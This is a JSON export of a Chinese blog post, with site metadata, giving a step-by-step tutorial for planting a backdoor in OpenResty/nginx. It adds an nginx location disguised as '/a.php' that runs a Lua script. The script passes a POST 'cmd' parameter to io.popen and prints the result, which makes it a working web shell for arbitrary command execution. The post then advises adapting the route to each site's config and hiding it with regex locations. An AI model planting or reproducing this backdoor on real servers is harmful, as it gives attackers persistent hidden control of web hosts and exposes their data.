{"title":"Nginx Lua Backdoor","uid":"970f78f91b4a772fd27540c6490b2c04","slug":"zl/2016-01-01-485_Nginx Lua Backdoor ","date":"2024-04-03T03:47:35.768Z","updated":"2024-04-03T03:47:35.768Z","comments":true,"path":"api/articles/zl/2016-01-01-485_Nginx Lua Backdoor .json","keywords":"AIGC,LLM,糖果AIGC实验室","cover":"https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg","content":"<p>在先知看到了apache利用lua留后门，就想着用nginx也试试</p><p>安装有ngx_lua模块，在openresty和tengine中是默认安装了ngx_lua模块的。</p><p>我这里拿openresty举例，你可以在这里<a href=\"https://openresty.org/download/openresty-1.15.8.1-win64.zip\">下载win平台</a>打包好的。</p><h1 id=\"步骤\">步骤</h1><p>找到conf/nginx.conf，在server块中添加路由</p><div class=\"highlight\"><div class=\"chroma\"><table class=\"lntable\"><tbody><tr><td class=\"lntd\"><pre class=\"chroma\"><code class=\"language-nginx\" data-lang=\"nginx\"><span class=\"lnt\">1\n</span><span class=\"lnt\">2\n</span><span class=\"lnt\">3\n</span><span class=\"lnt\">4\n</span></code></pre></td><td class=\"lntd\"><pre class=\"chroma\"><code class=\"language-nginx\" data-lang=\"nginx\"><span class=\"k\">location</span> <span class=\"p\">=</span> <span class=\"s\">/a.php</span> <span class=\"p\">&#123;</span>  \n    <span class=\"kn\">default_type</span> <span class=\"s\">&#39;text/plain&#39;</span><span class=\"p\">;</span>  \n    <span class=\"kn\">content_by_lua_file</span> <span class=\"s\">lua/backdoor.lua</span><span class=\"p\">;</span>\n<span class=\"p\">&#125;</span></code></pre></td></tr></tbody></table></div></div><p>然后创建<code>lua/backdoor.lua</code>脚本，你也可以创建在任意位置，不过要对应上文的<code>content_by_lua_file</code>字段</p><div class=\"highlight\"><div class=\"chroma\"><table class=\"lntable\"><tbody><tr><td class=\"lntd\"><pre class=\"chroma\"><code class=\"language-lua\" data-lang=\"lua\"><span class=\"lnt\">1\n</span><span class=\"lnt\">2\n</span><span class=\"lnt\">3\n</span><span class=\"lnt\">4\n</span><span class=\"lnt\">5\n</span><span class=\"lnt\">6\n</span><span class=\"lnt\">7\n</span><span class=\"lnt\">8\n</span></code></pre></td><td class=\"lntd\"><pre class=\"chroma\"><code class=\"language-lua\" data-lang=\"lua\"><span class=\"n\">ngx.req</span><span class=\"p\">.</span><span class=\"n\">read_body</span><span class=\"p\">()</span>\n<span class=\"kd\">local</span> <span class=\"n\">post_args</span> <span class=\"o\">=</span> <span class=\"n\">ngx.req</span><span class=\"p\">.</span><span class=\"n\">get_post_args</span><span class=\"p\">()</span>\n<span class=\"kd\">local</span> <span class=\"n\">cmd</span> <span class=\"o\">=</span> <span class=\"n\">post_args</span><span class=\"p\">[</span><span class=\"s2\">&#34;cmd&#34;</span><span class=\"p\">]</span>\n<span class=\"kr\">if</span> <span class=\"n\">cmd</span> <span class=\"kr\">then</span>\n    <span class=\"n\">f_ret</span> <span class=\"o\">=</span> <span class=\"n\">io.popen</span><span class=\"p\">(</span><span class=\"n\">cmd</span><span class=\"p\">)</span>\n    <span class=\"kd\">local</span> <span class=\"n\">ret</span> <span class=\"o\">=</span> <span class=\"n\">f_ret</span><span class=\"p\">:</span><span class=\"n\">read</span><span class=\"p\">(</span><span class=\"s2\">&#34;*a&#34;</span><span class=\"p\">)</span>\n    <span class=\"n\">ngx.say</span><span class=\"p\">(</span><span class=\"n\">string.format</span><span class=\"p\">(</span><span class=\"s2\">&#34;%s&#34;</span><span class=\"p\">,</span> <span class=\"n\">ret</span><span class=\"p\">))</span>\n<span class=\"kr\">end</span></code></pre></td></tr></tbody></table></div></div><p>重载nginx</p><div class=\"highlight\"><div class=\"chroma\"><table class=\"lntable\"><tbody><tr><td class=\"lntd\"><pre class=\"chroma\"><code class=\"language-bash\" data-lang=\"bash\"><span class=\"lnt\">1\n</span></code></pre></td><td class=\"lntd\"><pre class=\"chroma\"><code class=\"language-bash\" data-lang=\"bash\">nginx -s reload</code></pre></td></tr></tbody></table></div></div><p>浏览器访问</p><p><img src=\"https://y4er.com/img/uploads/20190901174819.png\" alt=\"20190901174819\"/></p><h1 id=\"文后\">文后</h1><p>在实际的环境中，conf文件并不固定，你需要针对不同站点的配置文件去修改。</p><p>而location你可以更灵活一些，毕竟他能用正则表达式�，具体怎么用看你自己咯。</p><p>参考链接</p><ol><li><a href=\"https://github.com/netxfly/nginx_lua_security\">https://github.com/netxfly/nginx_lua_security</a></li><li><a href=\"https://xz.aliyun.com/t/6088\">https://xz.aliyun.com/t/6088</a></li></ol><p><strong>文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。</strong></p>","text":"在先知看到了apache利用lua留后门，就想着用nginx也试试安装有ngx_lua模块，在openresty和tengine中是默认安装了ngx_lua模块的。我这里拿openresty举例，你可以在这里下载win平台打包好的。步骤找到conf/nginx.conf，在ser...","link":"","photos":[],"count_time":{"symbolsCount":807,"symbolsTime":"1 mins."},"categories":[{"name":"topic","slug":"topic","count":1441,"path":"api/categories/topic.json"}],"tags":[{"name":"lua文章","slug":"lua文章","count":1133,"path":"api/tags/lua文章.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%AD%A5%E9%AA%A4\"><span class=\"toc-text\">步骤</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%96%87%E5%90%8E\"><span class=\"toc-text\">文后</span></a></li></ol>","author":{"name":"安全书","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"《墨守之道-Web服务安全架构与实践》","socials":{"github":"https://github.com/shengnoah","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"https://weibo.com/u/3732639263","zhihu":"https://www.zhihu.com/people/openresty","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Lua标准库","uid":"fa374b256846497ad36372533ba9888a","slug":"zl/2016-01-01-489_Lua标准库","date":"2024-04-03T03:47:35.769Z","updated":"2024-04-03T03:47:35.769Z","comments":true,"path":"api/articles/zl/2016-01-01-489_Lua标准库.json","keywords":"AIGC,LLM,糖果AIGC实验室","cover":"https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg","text":"lua标准库之数学库 数学库概念数学库由算术函数的标准集合组成；比如三角函数（sin、cos、tan、asin、acos、etc）幂指函数（exp、log、log10），舍入函数（floor、ceil）、max、min，加上一个变量pi，数学库也定义了一个幂操作符 ^ 函数 描述...","link":"","photos":[],"count_time":{"symbolsCount":"2.5k","symbolsTime":"2 mins."},"categories":[{"name":"topic","slug":"topic","count":1441,"path":"api/categories/topic.json"}],"tags":[{"name":"lua文章","slug":"lua文章","count":1133,"path":"api/tags/lua文章.json"}],"author":{"name":"安全书","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"《墨守之道-Web服务安全架构与实践》","socials":{"github":"https://github.com/shengnoah","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"https://weibo.com/u/3732639263","zhihu":"https://www.zhihu.com/people/openresty","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Car Evaluation数据集","uid":"a45c99cb71039628967718497c493671","slug":"zl/2016-01-01-486_Car Evaluation数据集","date":"2024-04-03T03:47:35.768Z","updated":"2024-04-03T03:47:35.768Z","comments":true,"path":"api/articles/zl/2016-01-01-486_Car Evaluation数据集.json","keywords":"AIGC,LLM,糖果AIGC实验室","cover":"https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg","text":"提供者：杜成玉下载地址：http://archive.ics.uci.edu/ml/machine-learning-databases/car/ 数据来源：https://www.jianshu.com/p/be23b3870d2e这是一个关于汽车测评的数据集，类别变量为汽车的...","link":"","photos":[],"count_time":{"symbolsCount":"1.2k","symbolsTime":"1 mins."},"categories":[{"name":"topic","slug":"topic","count":1441,"path":"api/categories/topic.json"}],"tags":[{"name":"lua文章","slug":"lua文章","count":1133,"path":"api/tags/lua文章.json"}],"author":{"name":"安全书","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"《墨守之道-Web服务安全架构与实践》","socials":{"github":"https://github.com/shengnoah","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"https://weibo.com/u/3732639263","zhihu":"https://www.zhihu.com/people/openresty","csdn":"","juejin":"","customs":{}}}}}